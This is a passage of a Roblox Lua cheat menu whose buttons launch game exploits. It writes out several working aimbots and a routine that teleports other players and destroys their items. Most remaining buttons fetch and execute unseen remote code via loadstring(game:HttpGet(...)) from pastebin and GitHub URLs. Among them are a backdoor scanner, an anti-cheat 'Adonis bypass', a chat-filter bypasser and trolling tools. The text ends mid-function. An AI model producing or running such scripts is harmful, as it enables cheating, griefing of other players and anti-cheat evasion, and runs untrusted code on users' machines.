		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("ALADIA AIMBOT VERSION 2 (MONSY)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera
 
local AimEnabled = false  -- Toggle aim on/off
local Smoothness = 1   -- Lower value for ultra-smooth tracking (closer to 0 is slower, more precise)
local AimbotMode = "Instant" -- Options: "Instant", "Smooth"
local FOV = 7  -- Field of View in degrees (adjust to your preference)
 
-- Function to get head, neck, or humanoid root part for aiming
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
 
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
 
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end
 
-- Function to find the closest player's head or neck with distance and FOV check
local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
 
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    -- Calculate distance to the target
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
 
                    -- Calculate FOV
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
 
                        -- Check if within FOV and the closest distance
                        if angle <= FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end
 
-- Aimbot Function
local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), Smoothness)
        end
    end
end
 
-- Toggle Aimbot on right click hold
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Right Click to activate
        AimEnabled = true
    end
end)
 
UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then  -- Release Right Click to deactivate
        AimEnabled = false
    end
end)
 
-- Run Aimbot every frame
RunService.RenderStepped:Connect(function()
    if AimEnabled then
        aimAtTarget()
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FANTASMA AIMBOT (DETECTED)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/usbkillerx/EZhacker/refs/heads/main/EZhack"))()
end)

addMainMenuButton("AIMBOT ON AND OFF (CHESTER)", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local FOVToggleButton = Instance.new("TextButton")  -- FOV visibility toggle button
local AimbotToggleButton = Instance.new("TextButton")  -- Aimbot ON/OFF toggle button

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180)  -- Adjusted size to accommodate two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL AIMBOT CHESTER" -- Custom Title
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.Roboto
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(0,0,0)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.Roboto
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- FOV Visibility Toggle button (top)
FOVToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
FOVToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
FOVToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
FOVToggleButton.TextSize = 14
FOVToggleButton.Font = Enum.Font.Roboto
FOVToggleButton.Text = "FOV: Visible"
FOVToggleButton.Parent = Frame

-- Aimbot ON/OFF Toggle button (bottom)
AimbotToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimbotToggleButton.Position = UDim2.new(0.1, 0, 0.85, 0)
AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
AimbotToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
AimbotToggleButton.TextSize = 14
AimbotToggleButton.Font = Enum.Font.Roboto
AimbotToggleButton.Text = "Aimbot: On"
AimbotToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
FOVToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        FOVToggleButton.Text = "FOV: Visible"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        FOVToggleButton.Text = "FOV: Hidden"
        FOVToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Toggle Aimbot functionality (ON/OFF)
AimbotToggleButton.MouseButton1Click:Connect(function()
    if Environment.Aimbot.Enabled then
        -- Turn Aimbot off
        Environment.Aimbot.Enabled = false
        AimbotToggleButton.Text = "Aimbot: Off"  -- Change text to Off
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)  -- Red background
    else
        -- Turn Aimbot on
        Environment.Aimbot.Enabled = true
        AimbotToggleButton.Text = "Aimbot: On"  -- Change text to On
        AimbotToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)  -- Green background
    end
end)

-- Initial setup for the slider
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT SUPPORTED CELLPHONE (MONSY)", function()
	--[[ 
    DEV TEST AIMBOT (Head Target)
    + White FOV circle
    + Mobile: works only when scoped (zoom in)
]]

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local cam = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

-- SETTINGS
local ENABLED = false
local FOV = 50         -- Aim cone in degrees
local SMOOTH = 12      -- Higher = faster aim
local MAX_DIST = 250   -- Max distance
local SCOPE_FOV = 50   -- Camera FOV threshold to consider as scoped

-- Draw FOV Circle
local fovCircle = Drawing.new("Circle")
fovCircle.Color = Color3.fromRGB(255, 255, 255) -- White
fovCircle.Thickness = 1
fovCircle.NumSides = 64
fovCircle.Radius = FOV * 2
fovCircle.Filled = false
fovCircle.Visible = true

-- Create on-screen toggle button (mobile)
local function makeToggleButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = ""
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local btn = Instance.new("TextButton")
    btn.Name = ""
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(1, -150, 1, -90)
    btn.BackgroundTransparency = 0.4
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.TextSize = 16
    btn.Text = "AutoAim: OFF"
    btn.Parent = screenGui

    btn.MouseButton1Click:Connect(function()
        ENABLED = not ENABLED
        btn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
    end)
end

makeToggleButton()

-- PC toggle key
UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.O then
        ENABLED = not ENABLED
        local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("DevAutoAimToggle")
        if gui and gui:FindFirstChild("AutoAimBtn") then
            gui.AutoAimBtn.Text = "AutoAim: " .. (ENABLED and "ON" or "OFF")
        end
    end
end)

-- Function to get nearest target's head
local function getNearestTarget()
    local best, bestAngle = nil, math.huge
    local origin = cam.CFrame.Position
    local forward = cam.CFrame.LookVector

    for _, pl in pairs(Players:GetPlayers()) do
        if pl ~= player and pl.Character and pl.Character:FindFirstChild("Head") then
            local head = pl.Character.Head
            local dir = head.Position - origin
            local dist = dir.Magnitude
            if dist <= MAX_DIST then
                local angle = math.deg(math.acos(math.clamp(forward:Dot(dir.Unit), -1, 1)))
                if angle <= FOV/2 and angle < bestAngle then
                    -- Optional LOS check
                    local ray = Ray.new(origin, dir.Unit * dist)
                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, {player.Character}, false, true)
                    if not hit or hit:IsDescendantOf(pl.Character) then
                        best = head
                        bestAngle = angle
                    end
                end
            end
        end
    end
    return best
end

-- Auto-aim loop
RunService.RenderStepped:Connect(function(dt)
    -- Update FOV circle position
    local viewportSize = cam.ViewportSize
    fovCircle.Position = Vector2.new(viewportSize.X/2, viewportSize.Y/2)
    fovCircle.Radius = FOV * 2

    -- Mobile scope check
    local isScoped = (UserInputService.TouchEnabled and cam.FieldOfView <= SCOPE_FOV)
    
    -- Only aim if enabled + (PC or mobile scoped)
    if not ENABLED or (UserInputService.TouchEnabled and not isScoped) then
        return
    end

    local target = getNearestTarget()
    if target and target.Parent then
        local curPos = cam.CFrame.Position
        local curLook = cam.CFrame.LookVector
        local wantLook = (target.Position - curPos).Unit
        local t = 1 - math.exp(-SMOOTH * dt)
        local newLook = (curLook:Lerp(wantLook, t)).Unit
        cam.CFrame = CFrame.new(curPos, curPos + newLook)
    end
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE MUSCLE K TO OPEN / CLOSE (MONSY)", function()
	--// CONFIG
getgenv().Environment = {
	FOVSettings = {
		Amount = 150,
		Visible = true,
		Color = Color3.fromRGB(255, 255, 255)
	},
	Aimbot = {
		Enabled = true,
		AimPart = "Head"
	}
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

----------------------------------------------------------------
-- FOV CIRCLE
----------------------------------------------------------------
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

RunService.RenderStepped:Connect(function()
	Circle.Position = UIS:GetMouseLocation()
	Circle.Radius = Environment.FOVSettings.Amount
	Circle.Visible = Environment.FOVSettings.Visible
end)

----------------------------------------------------------------
-- AIMBOT CLOSEST TARGET
----------------------------------------------------------------
local function GetClosestPlayer()
	local closest, dist = nil, Environment.FOVSettings.Amount
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild(Environment.Aimbot.AimPart) then
			local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(p.Character[Environment.Aimbot.AimPart].Position)
			if onScreen then
				local mag = (Vector2.new(pos.X, pos.Y) - UIS:GetMouseLocation()).Magnitude
				if mag < dist then
					closest = p
					dist = mag
				end
			end
		end
	end
	return closest
end

RunService.RenderStepped:Connect(function()
	if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
		local t = GetClosestPlayer()
		if t then
			workspace.CurrentCamera.CFrame = CFrame.new(
				workspace.CurrentCamera.CFrame.Position,
				t.Character[Environment.Aimbot.AimPart].Position
			)
		end
	end
end)

----------------------------------------------------------------
-- UI SETUP
----------------------------------------------------------------
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = ""
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 230, 0, 200)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
Frame.BorderSizePixel = 0
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "PUBLIC ENEMY AIMBOT"
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Roboto
Title.TextSize = 16

----------------------------------------------------------------
-- FOV SLIDER
----------------------------------------------------------------
local SliderBack = Instance.new("Frame", Frame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 8)
SliderBack.Position = UDim2.new(0.1, 0, 0.32, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", SliderBack).CornerRadius = UDim.new(0, 6)

local SliderFill = Instance.new("Frame", SliderBack)
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", SliderFill).CornerRadius = UDim.new(0, 6)

local SliderButton = Instance.new("Frame", Frame)
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.29, -5)
SliderButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", SliderButton).CornerRadius = UDim.new(1, 0)

local FOVLabel = Instance.new("TextLabel", Frame)
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.42, 0)
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(255,255,255)
FOVLabel.Font = Enum.Font.Roboto
FOVLabel.TextSize = 14

----------------------------------------------------------------
-- FOV ON/OFF BUTTON (BLACK BUTTON + WHITE TEXT)
----------------------------------------------------------------
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.8, 0, 0, 28)
ToggleButton.Position = UDim2.new(0.1, 0, 0.60, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0,0,0)  -- BLACK
ToggleButton.TextColor3 = Color3.fromRGB(255,255,255)  -- WHITE
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.TextSize = 14
ToggleButton.Text = "FOV: Visible"
Instance.new("UICorner", ToggleButton).CornerRadius = UDim.new(0, 8)

----------------------------------------------------------------
-- AIMBOT ON/OFF BUTTON
----------------------------------------------------------------
local AimbotButton = Instance.new("TextButton", Frame)
AimbotButton.Size = UDim2.new(0.8, 0, 0, 28)
AimbotButton.Position = UDim2.new(0.1, 0, 0.78, 0)
AimbotButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
AimbotButton.TextColor3 = Color3.fromRGB(255,255,255)
AimbotButton.Font = Enum.Font.Roboto
AimbotButton.TextSize = 14
AimbotButton.Text = "AIMBOT: ON"
Instance.new("UICorner", AimbotButton).CornerRadius = UDim.new(0, 8)

----------------------------------------------------------------
-- SLIDER LOGIC (FIXED)
----------------------------------------------------------------
local draggingSlider = false

local function updateFOV(percent)
	percent = math.clamp(percent, 0, 1)
	SliderFill.Size = UDim2.new(percent, 0, 1, 0)
	SliderButton.Position = UDim2.new(percent, -10, 0.29, -5)
	local newFOV = math.floor(50 + percent * 400)
	Environment.FOVSettings.Amount = newFOV
	FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.InputBegan:Connect(function(i)
	if i.UserInputType == Enum.UserInputType.MouseButton1 then
		draggingSlider = true
	end
end)

UIS.InputEnded:Connect(function(i)
	if i.UserInputType == Enum.UserInputType.MouseButton1 then
		draggingSlider = false
	end
end)

UIS.InputChanged:Connect(function(i)
	if draggingSlider and i.UserInputType == Enum.UserInputType.MouseMovement then
		local x = UIS:GetMouseLocation().X
		local minX = SliderBack.AbsolutePosition.X
		local maxX = minX + SliderBack.AbsoluteSize.X
		local percent = (x - minX) / (maxX - minX)
		updateFOV(percent)
	end
end)

----------------------------------------------------------------
-- TOGGLES
----------------------------------------------------------------
ToggleButton.MouseButton1Click:Connect(function()
	Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
	if Environment.FOVSettings.Visible then
		ToggleButton.Text = "FOV: Visible"
	else
		ToggleButton.Text = "FOV: Hidden"
	end
end)

AimbotButton.MouseButton1Click:Connect(function()
	Environment.Aimbot.Enabled = not Environment.Aimbot.Enabled
	if Environment.Aimbot.Enabled then
		AimbotButton.Text = "AIMBOT: ON"
	else
		AimbotButton.Text = "AIMBOT: OFF"
	end
end)

----------------------------------------------------------------
-- CLOSE GUI (HOTKEY = K)
----------------------------------------------------------------
local guiOpen = true

UIS.InputBegan:Connect(function(i)
	if i.KeyCode == Enum.KeyCode.K then
		guiOpen = not guiOpen
		ScreenGui.Enabled = guiOpen
	end
end)

----------------------------------------------------------------
-- INITIAL SETUP
----------------------------------------------------------------
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["SCRIPT MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("BACKDOOR SCANNER (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/inks0adx",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BRING PART (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/qEw15UV3",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT SPAWNER (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/8f5yA0An",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADMIN TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/VjzUsTdB",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("FLING SELECT (MONSY)", function()
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-fling-gui-8018"))() 
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("JERK (MONSY)", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CHAT TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("SHY GUY (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/SpiderScriptRBUniversal/refs/heads/main/Protected_Spider.txt"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AIMBOT V2 (MONSY)", function()
	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V1 TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("V2 TROLL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("ADONIS BYPASS CP (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CLIENT BRING  (MONSY)", function()
	local L1 = true;
local L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L3 = L2.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
    if L_4_arg1 == 'f' then
        L1 = not L1
    end;
    if L_4_arg1 == 'r' then
        L2 = game.Players.LocalPlayer.Character.HumanoidRootPart;
        L3 = L2.Position - Vector3.new(5, 0, 0)
    end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
    if L_6_forvar2 == game.Players.LocalPlayer then
    else
        local L7 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L8, L9 = pcall(function()
                    local L10 = L_6_forvar2.Character;
                    if L10 then
                        if L10:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_6_forvar2.Backpack:ClearAllChildren()
                                for L_11_forvar1, L_12_forvar2 in pairs(L10:GetChildren()) do
                                    if L_12_forvar2:IsA("Tool") then
                                        L_12_forvar2:Destroy()
                                    end
                                end;
                                L10.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L8 then
                else
                    warn("Unnormal error: "..L9)
                end
            end)
        end)
        coroutine.resume(L7)
    end
end;
-- check for updates
game.Players.PlayerAdded:Connect(function(L_13_arg1)
    if L_13_arg1 == game.Players.LocalPlayer then
    else
        local L14 = coroutine.create(function()
            game:GetService('RunService').RenderStepped:Connect(function()
                local L15, L16 = pcall(function()
                    local L17 = L_13_arg1.Character;
                    if L17 then
                        if L17:FindFirstChild("HumanoidRootPart") then
                            if L1 then
                                L_13_arg1.Backpack:ClearAllChildren()
                                for L_18_forvar1, L_19_forvar2 in pairs(L17:GetChildren()) do
                                    if L_19_forvar2:IsA("Tool") then
                                        L_19_forvar2:Destroy()
                                    end
                                end;
                                L17.HumanoidRootPart.CFrame = CFrame.new(L3)
                            end
                        end
                    end
                end)
                if L15 then
                else
                    warn("Unnormal error: "..L16)
                end
            end)
        end)
        coroutine.resume(L14)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PRESS Q TO FREECAM (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 150
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
